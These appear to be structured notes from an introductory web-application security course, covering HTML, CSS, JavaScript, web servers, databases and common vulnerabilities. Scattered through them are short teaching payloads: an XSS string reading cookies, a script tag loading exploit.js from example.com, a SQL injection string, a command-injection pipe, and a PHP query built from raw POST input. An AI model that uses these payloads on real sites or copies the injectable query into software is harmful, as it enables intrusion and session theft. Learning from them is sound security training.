# Introduction 

**COMMANDS**

**PAYLOADS**

**CODE**

**PATHS / ENDPOINTS**

[https://www.hackthebox.eu/home/](https://www.hackthebox.eu/home/)

**TOOLS / SERVICES**

WordPress  
OpenCart  
Joomla  
Wix  
Shopify  
DotNetNuke

**DOM ELEMENTS**

**REQUEST PATTERNS**

username=bjones&password=Welcome1&email=[bjones@inlanefreight.local](mailto:bjones@inlanefreight.local)&roleid=3

---


# Web Application Layout

**COMMANDS**

**PAYLOADS**

**CODE**

**PATHS / ENDPOINTS**

[https://www.acme.local](https://www.acme.local/)

**TOOLS / SERVICES**

Docker  
AWS  
GCP  
Azure  
IIS  
PHP-CGI  
ISAPI  
ASP.NET Core

**DOM ELEMENTS**

**REQUEST PATTERNS**

---


# Front End vs. Back End 

**COMMANDS**

**PAYLOADS**

**CODE**

```html
<p><strong>Welcome to Hack The Box Academy</strong><strong></strong></p>
<p></p>
<p><em>This is some italic text.</em></p>
<p></p>
<p><span style="color: #0000ff;">This is some blue text.</span></p>
<p></p>
<p></p>
```

**PATHS / ENDPOINTS**

**TOOLS / SERVICES**

Apache  
NGINX  
IIS  
MySQL  
MSSQL  
Oracle  
PostgreSQL  
NoSQL  
MongoDB  
Laravel  
ASP.NET  
Spring  
Django  
Express  
Docker  
Linux  
Windows

**DOM ELEMENTS**

p  
strong  
em  
span

style="color: #0000ff;"

**REQUEST PATTERNS**

---


# HTML

**COMMANDS**

**PAYLOADS**

%27  
+  
%20  
%21  
%22  
%23  
%24  
%25  
%26  
%27  
%28  
%29

**CODE**

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Page Title</title>
    </head>
    <body>
        <h1>A Heading</h1>
        <p>A Paragraph</p>
    </body>
</html>
```

```text
document
 - html
   -- head
      --- title
   -- body
      --- h1
      --- p
```

```html
<html>
    <head>
<title>Page Title</title>
    </head>
    <body>
<h1>A Heading</h1>
<p>A Paragraph</p>
    </body>
</html>
```

```html
<p>
```

```html
<p id='para1'>
```

```html
<p id='red-paragraphs'>
```

```html
<head>
```

```html
<body>
```

```html
<style>
```

```html
<script>
```

```text
document.head
```

```text
document.h1
```

**PATHS / ENDPOINTS**

**TOOLS / SERVICES**

Burp Suite  
Pwnbox  
Parrot Linux

**DOM ELEMENTS**

html  
head  
title  
body  
h1  
p  
style  
script  
id  
class

**REQUEST PATTERNS**


# Cascading Style Sheets (CSS)

**COMMANDS**

**PAYLOADS**

**CODE**

```css
body {
  background-color: black;
}

h1 {
  color: white;
  text-align: center;
}

p {
  font-family: helvetica;
  font-size: 10px;
}
```

```css
element { property : value; }
```

```css
@keyframes
```

```css
animation
```

```css
animation-duration
```

```css
animation-direction
```

**PATHS / ENDPOINTS**

**TOOLS / SERVICES**

Bootstrap  
SASS  
Foundation  
Bulma  
Pure  
Pwnbox  
Parrot Linux  
CodePen

**DOM ELEMENTS**

body  
h1  
p  
class  
id

background-color  
color  
text-align  
font-family  
font-size  
height  
position  
border  
margin  
padding

**REQUEST PATTERNS**


# JavaScript 

**COMMANDS**

**PAYLOADS**

**CODE**

```html
<script type="text/javascript">
..JavaScript code..
</script>
```

```html
<script src="./script.js"></script>
```

```javascript
document.getElementById("button1").innerHTML = "Changed Text!";
```

**PATHS / ENDPOINTS**

./script.js

**TOOLS / SERVICES**

NodeJS  
Ajax  
JSFiddle  
Angular  
React  
Vue  
jQuery

**DOM ELEMENTS**

script  
type="text/javascript"  
src  
button1  
innerHTML  
document.getElementById()

**REQUEST PATTERNS**


# Sensitive Data Exposure

**COMMANDS**

ctrl + u

**PAYLOADS**

test:test

**CODE**

```text
view-source:https://www.google.com/
```

```html
<form action="action_page.php" method="post">

    <div class="container">
        <label for="uname"><b>Username</b></label>
        <input type="text" required>

        <label for="psw"><b>Password</b></label>
        <input type="password" required>

        <!-- TODO: remove test credentials test:test -->

        <button type="submit">Login</button>
    </div>
</form>

</html>
```

```html
<!-- TODO: remove test credentials test:test -->
```

**PATHS / ENDPOINTS**

view-source:[https://www.google.com/](https://www.google.com/)  
[https://www.google.com/](https://www.google.com/)  
action_page.php

**TOOLS / SERVICES**

Burp Suite  
Pwnbox  
Parrot Linux

**DOM ELEMENTS**

form  
action="action_page.php"  
method="post"  
div  
class="container"  
label  
for="uname"  
b  
input  
type="text"  
required  
for="psw"  
type="password"  
button  
type="submit"

**REQUEST PATTERNS**



# HTML Injection 

**COMMANDS**

**PAYLOADS**

```html
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```

**CODE**

```html
<!DOCTYPE html>
<html>

<body>
    <button onclick="inputFunction()">Click to enter your name</button>
    <p id="output"></p>

    <script>
        function inputFunction() {
            var input = prompt("Please enter your name", "");

            if (input != null) {
                document.getElementById("output").innerHTML = "Your name is " + input;
            }
        }
    </script>
</body>

</html>
```

```javascript
document.getElementById("output").innerHTML = "Your name is " + input;
```

```javascript
function inputFunction() {
    var input = prompt("Please enter your name", "");

    if (input != null) {
        document.getElementById("output").innerHTML = "Your name is " + input;
    }
}
```

**PATHS / ENDPOINTS**

[https://academy.hackthebox.com/images/logo.svg](https://academy.hackthebox.com/images/logo.svg)

**TOOLS / SERVICES**

Pwnbox  
Parrot Linux

**DOM ELEMENTS**

button  
onclick="inputFunction()"  
p  
id="output"  
script  
body  
style  
background-image  
document.getElementById("output").innerHTML  
prompt

**REQUEST PATTERNS**


# Cross-Site Scripting (XSS)

**COMMANDS**

**PAYLOADS**

```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

**CODE**

```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

**PATHS / ENDPOINTS**

/

**TOOLS / SERVICES**

Pwnbox  
Parrot Linux

**DOM ELEMENTS**

img  
src=/  
onerror=alert(document.cookie)  
document.cookie

**REQUEST PATTERNS**


# Cross-Site Request Forgery (CSRF) 

**COMMANDS**

**PAYLOADS**

```html
"><script src=//www.example.com/exploit.js></script>
```

**CODE**

```html
"><script src=//www.example.com/exploit.js></script>
```

**PATHS / ENDPOINTS**

//[www.example.com/exploit.js](http://www.example.com/exploit.js)

**TOOLS / SERVICES**

Web Application Firewall (WAF)

**DOM ELEMENTS**

script  
src  
```
"><script src=//[www.example.com/exploit.js](http://www.example.com/exploit.js)>
```

**REQUEST PATTERNS**


# Back End Servers 

**COMMANDS**

**PAYLOADS**

**CODE**

**PATHS / ENDPOINTS**

**TOOLS / SERVICES**

Apache  
NGINX  
IIS  
MySQL  
MS SQL  
Oracle  
PHP  
.NET  
Java  
Linux  
Windows  
hypervisors  
containers  
WAFs  
LAMP  
WAMP  
WINS  
MAMP  
XAMPP  
macOS  
PERL  
Pwnbox  
Parrot Linux

**DOM ELEMENTS**

**REQUEST PATTERNS**


# Web Servers 

**COMMANDS**

```bash
curl -I https://academy.hackthebox.com
```

```bash
curl https://academy.hackthebox.com
```

**PAYLOADS**

**CODE**

```text
200 OK
301 Moved Permanently
302 Found
400 Bad Request
401 Unauthorized
403 Forbidden
404 Not Found
405 Method Not Allowed
408 Request Timeout
500 Internal Server Error
502 Bad Gateway
504 Gateway Timeout
```

**PATHS / ENDPOINTS**

[https://academy.hackthebox.com](https://academy.hackthebox.com/)

**TOOLS / SERVICES**

cURL  
Apache  
httpd  
PHP  
.Net  
Python  
Perl  
Bash  
CGI  
mod_php  
NGINX  
IIS  
Internet Information Services  
Microsoft Windows Server  
Microsoft .NET  
FTP  
Active Directory  
Windows Auth  
Apache Tomcat  
Node.JS  
Linux  
Windows  
macOS  
Apple  
Adobe  
Baidu  
Google  
Facebook  
Twitter  
Cisco  
Intel  
Netflix  
HackTheBox  
Microsoft  
Office365  
Skype  
Stack Overflow  
Dell  
Pwnbox  
Parrot Linux

**DOM ELEMENTS**

**REQUEST PATTERNS**


# Databases 

**COMMANDS**

**PAYLOADS**

```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

```php
{'key':'value'}
```

**CODE**

```php
$conn = new mysqli("localhost", "user", "pass");
```

```php
$sql = "CREATE DATABASE database1";
$conn->query($sql)
```

```php
$conn = new mysqli("localhost", "user", "pass", "database1");
$query = "select * from table_1";
$result = $conn->query($query);
```

```php
$searchInput =  $_POST['findUser'];
$query = "select * from users where name like '%$searchInput%'";
$result = $conn->query($query);
```

```php
while($row = $result->fetch_assoc() ){
    echo $row["name"]."<br>";
}
```

**PATHS / ENDPOINTS**

localhost

**TOOLS / SERVICES**

MySQL  
MSSQL  
Oracle  
PostgreSQL  
SQLite  
MariaDB  
Amazon Aurora  
Azure SQL  
MongoDB  
ElasticSearch  
Apache Cassandra  
Redis  
Neo4j  
CouchDB  
Amazon DynamoDB  
JSON  
XML  
PHP  
Python  
Pwnbox  
Parrot Linux

**DOM ELEMENTS**

$_POST['findUser']

**REQUEST PATTERNS**


# Development Frameworks & APIs

**COMMANDS**

**PAYLOADS**

```http
POST /search.php HTTP/1.1
...SNIP...

item=apples
```

```xml
<?xml version="1.0"?>

<soap:Envelope
xmlns:soap="http://www.example.com/soap/soap/"
soap:encodingStyle="http://www.w3.org/soap/soap-encoding">

<soap:Header>
</soap:Header>

<soap:Body>
  <soap:Fault>
  </soap:Fault>
</soap:Body>

</soap:Envelope>
```

```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

**CODE**

```text
/search.php?item=apples
```

```text
/search/users/1
```

```text
userid 1
```

```text
GET /category/posts/
```

```text
GET request
POST request
PUT request
DELETE request
```

**PATHS / ENDPOINTS**

/search.php?item=apples  
/search.php  
search/users/1  
/category/posts/

**TOOLS / SERVICES**

Laravel  
PHP  
Express  
Node.JS  
Django  
Python  
Rails  
Ruby  
PayPal  
Yahoo  
Uber  
IBM  
MySpace  
Google  
YouTube  
Instagram  
Mozilla  
Pinterest  
GitHub  
Hulu  
Twitch  
Airbnb  
API  
HTTP  
Twitter API  
SOAP  
REST  
XML  
JSON  
x-www-form-urlencoded  
Pwnbox  
Parrot Linux

**DOM ELEMENTS**

**REQUEST PATTERNS**

item=apples


# Common Web Vulnerabilities 

**COMMANDS**

**PAYLOADS**

```text
' or 0=0 #
```

```text
shell.php.jpg
```

```text
| COMMAND...
```

**CODE**

```php
$query = "select * from users where name like '%$searchInput%'";
```

**PATHS / ENDPOINTS**

**TOOLS / SERVICES**

College Management System 1.2  
WordPress Plugin Responsive Thumbnail Slider 1.0  
Metasploit  
WordPress Plugin Plainview Activity Monitor 20161228  
PHP  
SQL

**DOM ELEMENTS**

email field  
ip value

**REQUEST PATTERNS**


# Public Vulnerabilities 

**COMMANDS**

**PAYLOADS**

**CODE**

```text
https://www.rapid7.com/db/?q=wordpress&type=nexpose
```

**PATHS / ENDPOINTS**

(version.php)  
[https://www.rapid7.com/db/?q=wordpress&type=nexpose](https://www.rapid7.com/db/?q=wordpress&type=nexpose)

**TOOLS / SERVICES**

CVE  
Common Vulnerabilities and Exposures  
Exploit DB  
Rapid7 DB  
Vulnerability Lab  
CVSS  
NVD  
CVSS v2  
CVSS v3  
Apache  
Shell-Shock  
TCP  
Pwnbox  
Parrot Linux

**DOM ELEMENTS**

**REQUEST PATTERNS**


#
#
